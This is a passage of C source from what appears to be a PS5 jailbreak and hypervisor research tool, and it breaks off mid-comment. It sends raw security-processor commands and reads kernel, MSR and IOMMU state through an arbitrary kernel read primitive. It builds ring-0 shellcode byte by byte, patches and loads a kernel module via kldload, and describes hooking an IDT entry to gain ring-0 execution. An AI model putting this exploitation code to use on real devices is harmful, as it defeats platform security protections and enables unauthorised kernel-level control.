        uint32_t unk38;           /* 0x38 */
        uint32_t segment_index;   /* 0x3C */
        uint32_t block_index;     /* 0x40 */
        uint32_t service_id;      /* 0x44 */
        uint8_t  digest[0x20];    /* 0x48 */
        uint8_t  pad[0x80 - 0x68];
    } __attribute__((packed)) load_block;

    uint8_t response[0x80];

    /* Test: LOAD_SELF_BLOCK with our buffer as out_pa and in_pa */
    printf("[*] LOAD_SELF_BLOCK with controlled out_pa and in_pa\n");

    memset(&load_block, 0, sizeof(load_block));
    load_block.function = SBL_FUNC_LOAD_SELF_BLOCK;
    load_block.out_pa = (uint64_t)(g_msg_phys + 0x2000);
    load_block.in_pa = (uint64_t)(g_msg_phys + 0x1000);
    load_block.aligned_size = 0x1000;
    load_block.size = 0x100;
    load_block.segment_index = 0;
    load_block.block_index = 0;

    memset(response, 0, sizeof(response));
    int ret = sbl_send_raw(SBL_AUTHMGR_CMD, &load_block, 0x80, response, 0x80);

    int32_t res;
    memcpy(&res, response + 0x04, sizeof(res));
    printf("    ret=%d, res=%d\n", ret, res);

    printf("    Response: ");
    for (int i = 0; i < 32; i++)
        printf("%02x", response[i]);
    printf("\n");

    /* Check if anything was written to out_pa */
    uint8_t *out_buf = (uint8_t *)g_msg_vaddr + 0x2000;
    int nonzero = 0;
    for (int i = 0; i < 256; i++) {
        if (out_buf[i] != 0) nonzero++;
    }
    printf("    out_pa buffer has %d non-zero bytes in first 256\n", nonzero);
    if (nonzero > 0) {
        printf("    First 32 bytes: ");
        for (int i = 0; i < 32; i++)
            printf("%02x", out_buf[i]);
        printf("\n");
    }
}

/*
 * Campaign 5: Kernel/HV reconnaissance
 * Read various kernel structures for recon purposes.
 */
static void campaign_kernel_recon(void) {
    printf("\n=============================================\n");
    printf("  Campaign 5: Kernel/HV Reconnaissance\n");
    printf("=============================================\n\n");

    /* Print kernel addresses */
    printf("[*] Kernel text base (derived) = 0x%lx\n", g_ktext_base);
    printf("[*] KERNEL_ADDRESS_DATA_BASE = 0x%lx\n", KERNEL_ADDRESS_DATA_BASE);
    printf("[*] KERNEL_ADDRESS_ALLPROC   = 0x%lx\n", KERNEL_ADDRESS_ALLPROC);
    printf("[*] DMAP base                = 0x%lx\n", g_dmap_base);
    printf("[*] SBL MMIO VA              = 0x%lx\n", g_mmio_vaddr);

    /* Read SBL MMIO region for identification */
    if (g_mmio_vaddr) {
        printf("\n[*] SBL MMIO register dump (first 32 DWORDs from cmd area):\n");
        for (int i = 0; i < 32; i++) {
            uint32_t val;
            if (kernel_copyout(g_mmio_vaddr + 0x10500 + (i * 4), &val, sizeof(val)) == 0) {
                printf("    MMIO+0x%05x: 0x%08x\n", 0x10500 + (i * 4), val);
            }
        }
    }

    /* Read security flags */
    if (KERNEL_ADDRESS_SECURITY_FLAGS) {
        uint8_t secflags[16];
        kernel_copyout(KERNEL_ADDRESS_SECURITY_FLAGS, secflags, sizeof(secflags));
        printf("\n[*] Security flags: ");
        for (int i = 0; i < 16; i++)
            printf("%02x", secflags[i]);
        printf("\n");
    }

    /* Read QA flags */
    uint8_t qaflags[16];
    if (kernel_get_qaflags(qaflags) == 0) {
        printf("[*] QA flags: ");
        for (int i = 0; i < 16; i++)
            printf("%02x", qaflags[i]);
        printf("\n");
    }

    /* Check if development mode is enabled */
    printf("[*] is_development_mode check: reading from security_flags...\n");

    /* Check if kldload might be available */
    printf("\n[*] Checking kldload availability...\n");
    printf("    FW < 6.50 should have GMET disabled, making kldload viable.\n");
    if (g_fw_version < 0x6500000) {
        printf("    [+] FW 0x%lx - GMET likely NOT enforced, kldload should work!\n", g_fw_version);
    } else {
        printf("    [-] FW 0x%lx - GMET likely enforced, kldload may not work.\n", g_fw_version);
    }
}

/*
 * Campaign 6: IOMMU Device Table Reconnaissance
 * Try to read the IOMMU device table entries via DMAP.
 * The IOMMU MMIO is typically at a PCI BAR address.
 */
static void campaign_iommu_recon(void) {
    printf("\n=============================================\n");
    printf("  Campaign 6: IOMMU Reconnaissance\n");
    printf("=============================================\n\n");

    if (!g_dmap_base) {
        printf("[-] No DMAP base, skipping IOMMU recon\n");
        return;
    }

    /*
     * AMD IOMMU MMIO is typically discovered via PCI config space.
     * The IOMMU capability block contains the MMIO base address.
     *
     * On PS5, the IOMMU base is at a known physical address.
     * Common AMD IOMMU MMIO bases: check PCI device 0:0.2
     *
     * We'll try to read the IOMMU device table base register
     * at MMIO offset 0x0000 (Device Table Base Address Register).
     */

    /* Try common IOMMU MMIO physical addresses */
    static const uint64_t iommu_candidates[] = {
        0xF0848000ULL,  /* Common on AMD desktop/APU */
        0xF0048000ULL,
        0xFEB00000ULL,
        0xF0040000ULL,
    };

    for (int i = 0; i < 4; i++) {
        uint64_t iommu_va = g_dmap_base + iommu_candidates[i];
        uint64_t dev_table_base;

        if (kernel_copyout(iommu_va, &dev_table_base, sizeof(dev_table_base)) == 0) {
            printf("[*] Trying IOMMU at PA 0x%lx (VA 0x%lx):\n",
                   iommu_candidates[i], iommu_va);
            printf("    Device Table Base Register: 0x%016lx\n", dev_table_base);

            /* Check if this looks like a valid device table base */
            uint64_t dt_phys = dev_table_base & 0x000FFFFFFFFFF000ULL;
            uint32_t dt_size = dev_table_base & 0x1FF;

            if (dt_phys > 0 && dt_phys < 0x800000000ULL && dt_size > 0) {
                printf("    DT physical: 0x%lx, size: 2^%u entries\n", dt_phys, dt_size + 1);

                /* Try to read the GPU's device table entry */
                /* GPU BDF is typically 00:01.0 = device_id 0x0008 */
                /* Or try scanning a few common BDFs */
                static const uint16_t gpu_bdf_candidates[] = {
                    0x0008,  /* 00:01.0 */
                    0x0100,  /* 00:20.0 */
                    0x0010,  /* 00:02.0 */
                };

                for (int j = 0; j < 3; j++) {
                    uint64_t dte_pa = dt_phys + (gpu_bdf_candidates[j] * 32);
                    uint64_t dte_va = g_dmap_base + dte_pa;
                    uint8_t dte[32];

                    if (kernel_copyout(dte_va, dte, sizeof(dte)) == 0) {
                        printf("    DTE[BDF=0x%04x]: ", gpu_bdf_candidates[j]);
                        for (int k = 0; k < 32; k++)
                            printf("%02x", dte[k]);
                        printf("\n");
                    }
                }

                /* Read IOMMU event log base */
                uint64_t evlog_base;
                kernel_copyout(iommu_va + 0x0010, &evlog_base, sizeof(evlog_base));
                printf("    Event Log Base: 0x%016lx\n", evlog_base);

                /* Read IOMMU command buffer base */
                uint64_t cmdbuf_base;
                kernel_copyout(iommu_va + 0x0008, &cmdbuf_base, sizeof(cmdbuf_base));
                printf("    Cmd Buffer Base: 0x%016lx\n", cmdbuf_base);

                printf("    [+] Found likely IOMMU at PA 0x%lx\n", iommu_candidates[i]);
                break;
            }
        }
    }
}

/*
 * Campaign 7: Kernel Module via kldload
 *
 * This is the core HV research campaign. It uses FreeBSD's native
 * kernel module loading (kldload) instead of sysent hijacking:
 *
 * 1. Write the embedded .ko file to disk
 * 2. Call kldload() to load it into the kernel
 *    - The kernel linker allocates memory, handles relocations
 *    - SYSINIT callback runs our init code in ring 0
 *    - Init reads MSRs, CRs, and optionally executes VMMCALLs
 * 3. Use kldsym() to find the hv_results symbol
 * 4. kernel_copyout() the results to userland
 * 5. kldunload() to clean up
 *
 * Advantages over sysent hijacking:
 *   - No sysent table scanning (was failing)
 *   - No data cave hunting
 *   - No NX bit clearing
 *   - Kernel handles all memory management and relocation
 *   - Works on FW < 6.50 (GMET not enforced)
 */
/* ============================================================
 * Shellcode builder: generates a minimal ring-0 MSR reader
 *
 * Builds position-independent machine code that:
 *   1. Saves clobbered registers
 *   2. Writes magic/status to shared output buffer (DMAP KVA)
 *   3. Reads MSRs and CRs via RDMSR / MOV CRn
 *   4. Stores results in kmod_result_buf format
 *   5. Restores registers and IRETQ back to ring 3
 *
 * The output KVA is embedded as a 64-bit immediate (movabs).
 * No relocations needed — fully self-contained.
 * ============================================================ */
static int build_msr_shellcode(uint8_t *buf, int bufmax, uint64_t output_kva) {
    int p = 0;

    /* Helper macros for common x86-64 encodings */
    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)

    /* Prologue: save registers we clobber (RAX, RCX, RDX, RDI) */
    EMIT(0x50);  /* push rax */
    EMIT(0x51);  /* push rcx */
    EMIT(0x52);  /* push rdx */
    EMIT(0x57);  /* push rdi */

    /* movabs $output_kva, %rdi */
    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);

    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
    EMIT(0x48); EMIT(0x89); EMIT(0x07);  /* mov %rax, (%rdi) */

    /* status = RUNNING: movl $1, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);

    /* MSR/CR reading table.
     * kmod_result_buf.msr_results starts at offset 32, each entry is 16 bytes:
     *   +0: uint32_t msr_id
     *   +4: uint32_t valid
     *   +8: uint64_t value */
    static const struct { uint32_t id; int is_cr; } msr_table[] = {
        { 0xC0000080, 0 },  /* EFER */
        { 0xC0000081, 0 },  /* STAR */
        { 0xC0000082, 0 },  /* LSTAR */
        { 0xC0000084, 0 },  /* SFMASK */
        { 0xC0000100, 0 },  /* FS_BASE */
        { 0xC0000101, 0 },  /* GS_BASE */
        { 0xC0000102, 0 },  /* KGS_BASE */
        { 0xC0000103, 0 },  /* TSC_AUX */
        { 0xFFFF0000, 1 },  /* CR0 (pseudo-MSR) */
        { 0xFFFF0003, 1 },  /* CR3 */
        { 0xFFFF0004, 1 },  /* CR4 */
    };
    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);

    for (int i = 0; i < n_entries; i++) {
        int32_t id_off  = 32 + i * 16;       /* msr_results[i].msr_id */
        int32_t val_off = 32 + i * 16 + 4;   /* msr_results[i].valid */
        int32_t dat_off = 32 + i * 16 + 8;   /* msr_results[i].value */

        if (!msr_table[i].is_cr) {
            /* mov $msr_num, %ecx */
            EMIT(0xB9); EMIT_U32(msr_table[i].id);
            /* rdmsr → EDX:EAX */
            EMIT(0x0F); EMIT(0x32);
            /* shl $32, %rdx */
            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
            /* or %rdx, %rax */
            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
        } else {
            uint32_t cr = msr_table[i].id & 0xF;
            /* mov %crN, %rax: 0F 20 (C0 + N*8) */
            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
        }

        /* Store msr_id: movl $id, disp(%rdi) */
        if (id_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
        }
        EMIT_U32(msr_table[i].id);

        /* Store valid=1: movl $1, disp(%rdi) */
        if (val_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
        }
        EMIT_U32(1);

        /* Store value: mov %rax, disp(%rdi) */
        if (dat_off < 128) {
            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
        } else {
            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
        }
    }

    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);

    /* status = DONE: movl $2, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);

    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);

    /* Epilogue: restore and return from interrupt */
    EMIT(0x5F);  /* pop rdi */
    EMIT(0x5A);  /* pop rdx */
    EMIT(0x59);  /* pop rcx */
    EMIT(0x58);  /* pop rax */
    EMIT(0x48); EMIT(0xCF);  /* iretq */

    #undef EMIT
    #undef EMIT_U32
    #undef EMIT_U64

    return p;
}

/* ============================================================
 * Build MSR/CR recon shellcode for SYSENT HOOK execution path
 *
 * Calling convention: int sys_foo(struct thread *td, void *uap)
 *   - RDI = td (we ignore it)
 *   - RSI = uap (we ignore it)
 *   - Return via RET (not IRETQ)
 *   - Caller-saved regs (RAX,RCX,RDX,RSI,RDI,R8-R11) can be clobbered
 *   - Must preserve RBX,RBP,R12-R15
 *
 * Reads safe MSRs + APIC_BASE + CR0/CR3/CR4, writes results
 * to kmod_result_buf format at output_kva.
 * ============================================================ */
static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
                                     uint64_t output_kva) {
    int p = 0;

    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)

    /* No push/pop needed — sysent dispatch saves caller-saved regs.
     * We only use RAX, RCX, RDX, RDI which are all caller-saved. */

    /* movabs $output_kva, %rdi */
    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);

    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
    EMIT(0x48); EMIT(0x89); EMIT(0x07);

    /* status = RUNNING: movl $1, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);

    /* MSR/CR reading table — includes APIC_BASE for suspend/resume research */
    static const struct { uint32_t id; int is_cr; } msr_table[] = {
        { 0xC0000080, 0 },  /* EFER */
        { 0xC0000081, 0 },  /* STAR */
        { 0xC0000082, 0 },  /* LSTAR (syscall entry) */
        { 0xC0000084, 0 },  /* SFMASK */
        { 0xC0000100, 0 },  /* FS_BASE */
        { 0xC0000101, 0 },  /* GS_BASE (per-CPU) */
        { 0xC0000102, 0 },  /* KERNEL_GS_BASE */
        { 0xC0000103, 0 },  /* TSC_AUX */
        { 0x0000001B, 0 },  /* APIC_BASE (local APIC phys addr) */
        { 0xFFFF0000, 1 },  /* CR0 (pseudo) */
        { 0xFFFF0003, 1 },  /* CR3 (pseudo) */
        { 0xFFFF0004, 1 },  /* CR4 (pseudo) */
    };
    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);

    for (int i = 0; i < n_entries; i++) {
        int32_t id_off  = 32 + i * 16;
        int32_t val_off = 32 + i * 16 + 4;
        int32_t dat_off = 32 + i * 16 + 8;

        if (!msr_table[i].is_cr) {
            /* mov $msr_num, %ecx */
            EMIT(0xB9); EMIT_U32(msr_table[i].id);
            /* rdmsr → EDX:EAX */
            EMIT(0x0F); EMIT(0x32);
            /* shl $32, %rdx */
            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
            /* or %rdx, %rax */
            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
        } else {
            uint32_t cr = msr_table[i].id & 0xF;
            /* mov %crN, %rax */
            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
        }

        /* Store msr_id: movl $id, disp(%rdi) */
        if (id_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
        }
        EMIT_U32(msr_table[i].id);

        /* Store valid=1: movl $1, disp(%rdi) */
        if (val_off < 128) {
            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
        } else {
            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
        }
        EMIT_U32(1);

        /* Store value: mov %rax, disp(%rdi) */
        if (dat_off < 128) {
            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
        } else {
            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
        }
    }

    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);

    /* status = DONE: movl $2, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);

    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);

    /* Return 0 (success) */
    EMIT(0x31); EMIT(0xC0);  /* xor eax, eax */
    EMIT(0xC3);               /* ret */

    #undef EMIT
    #undef EMIT_U32
    #undef EMIT_U64

    return p;
}

static void campaign_kmod_kldload(void) {
    printf("\n=============================================\n");
    printf("  Campaign 7: Kernel Module (kldload)\n");
    printf("=============================================\n\n");

    printf("[*] Kernel module (.ko) size: %lu bytes\n", KMOD_KO_SZ);

    if (!g_dmap_base) {
        printf("[-] No DMAP base available - cannot set up shared memory.\n");
        return;
    }

    /* Step 1: Allocate shared memory buffer for kmod output.
     * We allocate physically-contiguous direct memory and compute
     * its kernel VA via DMAP. The kmod writes results here. */
    printf("\n[*] Step 1: Allocating shared result buffer...\n");

    #define KMOD_RESULT_ALLOC_SIZE 0x4000  /* 16KB - plenty for 7200-byte struct */
    off_t result_phys = 0;
    void *result_vaddr = NULL;

    int ret = sceKernelAllocateDirectMemory(
        0, 0x180000000ULL,
        KMOD_RESULT_ALLOC_SIZE, 0x4000,
        SCE_KERNEL_WB_ONION,
        &result_phys
    );
    if (ret != 0) {
        printf("[-] sceKernelAllocateDirectMemory failed: 0x%x\n", ret);
        return;
    }

    ret = sceKernelMapDirectMemory(
        &result_vaddr, KMOD_RESULT_ALLOC_SIZE,
        SCE_KERNEL_PROT_CPU_RW,
        0, result_phys, 0x4000
    );
    if (ret != 0) {
        printf("[-] sceKernelMapDirectMemory failed: 0x%x\n", ret);
        return;
    }

    memset(result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);

    /*
     * The PA from sceKernelAllocateDirectMemory is a PS5 bus address,
     * NOT a CPU physical address. DMAP maps CPU physical addresses.
     * Walk the page tables to find the actual CPU PA backing our mapping.
     */
    uint64_t cpu_pa = va_to_cpu_pa((uint64_t)result_vaddr);
    printf("[+] Result buffer: userland VA=0x%lx\n", (unsigned long)result_vaddr);
    printf("    Direct memory PA: 0x%lx (PS5 bus address)\n", (unsigned long)result_phys);
    printf("    CPU physical PA:  0x%lx (from page table walk)\n", (unsigned long)cpu_pa);

    if (cpu_pa == 0) {
        printf("[-] Page table walk failed - cannot resolve CPU physical address.\n");
        return;
    }

    uint64_t result_kva = g_dmap_base + cpu_pa;
    printf("    DMAP kernel VA:   0x%lx\n", (unsigned long)result_kva);

    /* Verify: write a test pattern via userland, read via kernel_copyout */
    volatile uint64_t *test_ptr = (volatile uint64_t *)result_vaddr;
    *test_ptr = 0xBEEFCAFE12345678ULL;
    uint64_t verify;
    kernel_copyout(result_kva, &verify, sizeof(verify));
    printf("[*] DMAP verify: wrote 0xbeefcafe12345678, read back 0x%lx %s\n",
           (unsigned long)verify,
           verify == 0xBEEFCAFE12345678ULL ? "[OK]" : "[MISMATCH]");
    *test_ptr = 0; /* Clear test pattern */

    if (verify != 0xBEEFCAFE12345678ULL) {
        printf("[-] DMAP address verification failed!\n");
        printf("    The page table walk may have returned an incorrect PA.\n");
        return;
    }

    /* Step 2: Patch .ko with the DMAP output address and write to disk.
     * Find the sentinel value (OUTPUT_KVA_SENTINEL) in the .ko binary
     * and replace it with the kernel VA of our shared result buffer.
     * The kmod's init function will write results to this address. */
    printf("\n[*] Step 2: Patching .ko with output KVA and writing to disk...\n");

    /* Copy .ko to modifiable buffer */
    void *ko_buf = malloc((size_t)KMOD_KO_SZ);
    if (!ko_buf) {
        printf("[-] malloc failed for .ko copy\n");
        return;
    }
    memcpy(ko_buf, KMOD_KO, (size_t)KMOD_KO_SZ);

    /*
     * Patch g_output_kva by parsing the ELF symbol table.
     *
     * The sentinel value 0xDEAD000000000000 appears TWICE in the .ko:
     *   1. In .text as a MOV immediate (comparison constant)
     *   2. In .data as g_output_kva's initial value
     * A byte-scan would patch the wrong copy (#1), corrupting the
     * comparison and leaving g_output_kva unchanged. So we parse the
     * ET_REL ELF symbol table to find g_output_kva precisely.
     */
    int patched = 0;
    uint8_t *ko_bytes = (uint8_t *)ko_buf;

    /* Minimal ELF64 structures for symbol lookup */
    typedef struct {
        unsigned char e_ident[16];
        uint16_t e_type, e_machine;
        uint32_t e_version;
        uint64_t e_entry, e_phoff, e_shoff;
        uint32_t e_flags;
        uint16_t e_ehsize, e_phentsize, e_phnum;
        uint16_t e_shentsize, e_shnum, e_shstrndx;
    } Elf64_Ehdr_t;

    typedef struct {
        uint32_t sh_name, sh_type;
        uint64_t sh_flags, sh_addr, sh_offset, sh_size;
        uint32_t sh_link, sh_info;
        uint64_t sh_addralign, sh_entsize;
    } Elf64_Shdr_t;

    typedef struct {
        uint32_t st_name;
        uint8_t  st_info, st_other;
        uint16_t st_shndx;
        uint64_t st_value, st_size;
    } Elf64_Sym_t;

    #define SHT_SYMTAB 2

    Elf64_Ehdr_t *ehdr = (Elf64_Ehdr_t *)ko_bytes;
    Elf64_Shdr_t *shdrs = NULL;
    Elf64_Shdr_t *symtab_sh = NULL;

    if (ehdr->e_shoff && ehdr->e_shnum > 0) {
        shdrs = (Elf64_Shdr_t *)(ko_bytes + ehdr->e_shoff);

        /* Find .symtab */
        for (uint16_t i = 0; i < ehdr->e_shnum; i++) {
            if (shdrs[i].sh_type == SHT_SYMTAB) {
                symtab_sh = &shdrs[i];
                break;
            }
        }

        if (symtab_sh) {
            Elf64_Sym_t *syms = (Elf64_Sym_t *)(ko_bytes + symtab_sh->sh_offset);
            uint64_t nsyms = symtab_sh->sh_size / sizeof(Elf64_Sym_t);
            char *strtab = (char *)(ko_bytes + shdrs[symtab_sh->sh_link].sh_offset);

            for (uint64_t i = 0; i < nsyms; i++) {
                if (strcmp(strtab + syms[i].st_name, "g_output_kva") == 0) {
                    uint16_t shndx = syms[i].st_shndx;
                    if (shndx < ehdr->e_shnum) {
                        uint64_t file_off = shdrs[shndx].sh_offset + syms[i].st_value;
                        if (file_off + 8 <= (size_t)KMOD_KO_SZ) {
                            uint64_t cur;
                            memcpy(&cur, ko_bytes + file_off, 8);
                            printf("[+] ELF sym g_output_kva: section=%u, "
                                   "file_offset=0x%lx, current=0x%lx\n",
                                   shndx, (unsigned long)file_off,
                                   (unsigned long)cur);
                            memcpy(ko_bytes + file_off, &result_kva, 8);
                            printf("[+] Patched g_output_kva -> 0x%lx\n",
                                   (unsigned long)result_kva);
                            patched = 1;
                        }
                    }
                    break;
                }
            }
        }
    }

    /* Fallback: if ELF parsing failed, patch the LAST sentinel occurrence
     * (the first is in .text as an immediate, the last is in .data) */
    if (!patched) {
        printf("[!] ELF symbol lookup failed, falling back to byte scan...\n");
        size_t last_offset = (size_t)-1;
        for (size_t i = 0; i + 8 <= (size_t)KMOD_KO_SZ; i++) {
            uint64_t val;
            memcpy(&val, &ko_bytes[i], 8);
            if (val == OUTPUT_KVA_SENTINEL)
                last_offset = i;
        }
        if (last_offset != (size_t)-1) {
            memcpy(&ko_bytes[last_offset], &result_kva, 8);
            printf("[+] Patched LAST sentinel at .ko offset 0x%zx -> 0x%lx\n",
                   last_offset, (unsigned long)result_kva);
            patched = 1;
        }
    }

    if (!patched) {
        printf("[-] Could not find g_output_kva in .ko!\n");
        free(ko_buf);
        return;
    }

    /* Patch g_kdata_base and g_ktext_base sentinels for apic_ops campaign */
    {
        static const struct { const char *name; uint64_t sentinel; uint64_t value; } patches[] = {
            { "g_kdata_base", KDATA_BASE_SENTINEL, 0 },
            { "g_ktext_base", KTEXT_BASE_SENTINEL, 0 },
        };
        uint64_t patch_vals[2] = { g_kdata_base, g_ktext_base };

        if (symtab_sh) {
            Elf64_Sym_t *syms = (Elf64_Sym_t *)(ko_bytes + symtab_sh->sh_offset);
            uint64_t nsyms = symtab_sh->sh_size / sizeof(Elf64_Sym_t);
            char *strtab = (char *)(ko_bytes + shdrs[symtab_sh->sh_link].sh_offset);

            for (int pi = 0; pi < 2; pi++) {
                for (uint64_t i = 0; i < nsyms; i++) {
                    if (strcmp(strtab + syms[i].st_name, patches[pi].name) == 0) {
                        uint16_t shndx = syms[i].st_shndx;
                        if (shndx < ehdr->e_shnum) {
                            uint64_t file_off = shdrs[shndx].sh_offset + syms[i].st_value;
                            if (file_off + 8 <= (size_t)KMOD_KO_SZ) {
                                memcpy(ko_bytes + file_off, &patch_vals[pi], 8);
                                printf("[+] Patched %s -> 0x%lx\n",
                                       patches[pi].name, (unsigned long)patch_vals[pi]);
                            }
                        }
                        break;
                    }
                }
            }
        } else {
            /* Byte-scan fallback for kdata/ktext sentinels */
            for (int pi = 0; pi < 2; pi++) {
                for (size_t i = 0; i + 8 <= (size_t)KMOD_KO_SZ; i++) {
                    uint64_t val;
                    memcpy(&val, &ko_bytes[i], 8);
                    if (val == patches[pi].sentinel) {
                        memcpy(&ko_bytes[i], &patch_vals[pi], 8);
                        printf("[+] Patched %s (byte scan) -> 0x%lx\n",
                               patches[pi].name, (unsigned long)patch_vals[pi]);
                        break;  /* Only patch first occurrence */
                    }
                }
            }
        }
    }

    /* Write patched .ko to disk */
    FILE *ko = fopen("/data/etaHEN/hv_kmod.ko", "wb");
    if (!ko) {
        printf("[-] Failed to create /data/etaHEN/hv_kmod.ko: %s\n", strerror(errno));
        free(ko_buf);
        return;
    }

    size_t written = fwrite(ko_buf, 1, (size_t)KMOD_KO_SZ, ko);
    fclose(ko);
    free(ko_buf);

    if (written != (size_t)KMOD_KO_SZ) {
        printf("[-] Short write: %zu/%lu bytes\n", written, KMOD_KO_SZ);
        unlink("/data/etaHEN/hv_kmod.ko");
        return;
    }
    printf("[+] Wrote patched hv_kmod.ko (%zu bytes)\n", written);

    /* Step 3: Load the kernel module via kldload */
    printf("\n[*] Step 3: Loading kernel module via kldload(2)...\n");
    printf("    The kernel linker will:\n");
    printf("    - Parse the ET_REL ELF\n");
    printf("    - Allocate kernel memory, process relocations\n");
    printf("    - Call SYSINIT -> hv_init runs campaigns in ring 0\n");
    printf("    - hv_init copies results to our shared buffer via DMAP\n");

    int kid = syscall(SYS_kldload, "/data/etaHEN/hv_kmod.ko");
    if (kid < 0) {
        int err = errno;
        printf("[-] kldload failed: kid=%d, errno=%d (%s)\n", kid, err, strerror(err));

        if (err == 1 /* EPERM */) {
            printf("    EPERM: securelevel or priv_check rejected the load.\n");
        } else if (err == 2 /* ENOENT */) {
            printf("    ENOENT: file not found. Check /data/etaHEN/ exists.\n");
        } else if (err == 8 /* ENOEXEC */) {
            printf("    ENOEXEC: kernel rejected the ELF format.\n");
        }

        unlink("/data/etaHEN/hv_kmod.ko");
        return;
    }
    printf("[+] Module loaded! kid=%d\n", kid);

    /* kldstat diagnostic: get the module's reported load address */
    struct kld_file_stat kfs;
    memset(&kfs, 0, sizeof(kfs));
    kfs.version = sizeof(kfs);
    int ks_ret = syscall(SYS_kldstat, kid, &kfs);
    printf("    kldstat(%d): ret=%d, address=0x%lx, size=0x%lx\n",
           kid, ks_ret, (unsigned long)kfs.address, (unsigned long)kfs.size);
    if (kfs.address != 0) {
        printf("    kldstat reports module at 0x%lx (%lu bytes)\n",
               (unsigned long)kfs.address, (unsigned long)kfs.size);
        /* Try reading the first 16 bytes from the reported address via DMAP */
        uint64_t mod_pa = va_to_pa_quiet(kfs.address);
        if (mod_pa != 0) {
            uint8_t mod_hdr[16];
            kernel_copyout(g_dmap_base + (mod_pa & ~0xFFFULL) +
                           (kfs.address & 0xFFF), mod_hdr, 16);
            printf("    First 16 bytes at module base: ");
            for (int i = 0; i < 16; i++) printf("%02x ", mod_hdr[i]);
            printf("\n");
        } else {
            printf("    va_to_pa(0x%lx) returned 0 — page not mapped?\n",
                   (unsigned long)kfs.address);
        }
    } else {
        printf("    kldstat returned address=0 — kernel linker may not track module base.\n");
    }

    /* Step 4: Read results directly from shared buffer.
     * The kmod's hv_init wrote results to result_kva (DMAP-mapped).
     * Since we have result_vaddr mapped to the same physical memory,
     * we can read the results directly - no kldsym/kernel_copyout needed! */
    printf("\n[*] Step 4: Reading results from shared buffer...\n");

    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;

    printf("    First 64 bytes of shared buffer:\n      ");
    uint8_t *rp = (uint8_t *)result_vaddr;
    for (int i = 0; i < 64; i++) {
        printf("%02x ", rp[i]);
        if (i % 16 == 15) printf("\n      ");
    }
    printf("\n");

    /* Check for pre-campaign canary (0xAAAABBBBCCCCDDDD) at buffer start.
     * This is written by hv_init BEFORE campaigns run. If present,
     * it means hv_init ran and g_output_kva was correct, but the full
     * results weren't copied (campaign crash or copy skipped). */
    uint64_t first_qword;
    memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));

    /* ── Step 4b: IDT-based manual invocation (if SYSINIT/MOD_LOAD didn't fire) ──
     *
     * On PS5 FW 4.03 the kernel linker loads modules into RWX pages
     * (GMET is not enforced until FW 6.50) but does NOT process SYSINIT
     * or MOD_LOAD for dynamically loaded modules.
     *
     * Fallback: hook an IDT entry via kernel_copyin, point it at the
     * hv_idt_trampoline in the loaded module, and trigger "int N" from
     * userland.  The CPU transitions to ring 0 through the IDT gate and
     * executes our trampoline → hv_init → campaigns → IRETQ back.
     *
     * Since kldstat/kldsym are broken on PS5 (Sony modifications — they
     * return all zeros), we locate the module by scanning kernel virtual
     * memory for the trampoline's machine code signature.  The trampoline
     * is at offset 0 in .text, which is the first SHF_ALLOC section, so
     * it sits at the very start of the page-aligned kmem_malloc allocation.
     *
     * This mirrors the approach used by r0gdb / kstuff for kernel code
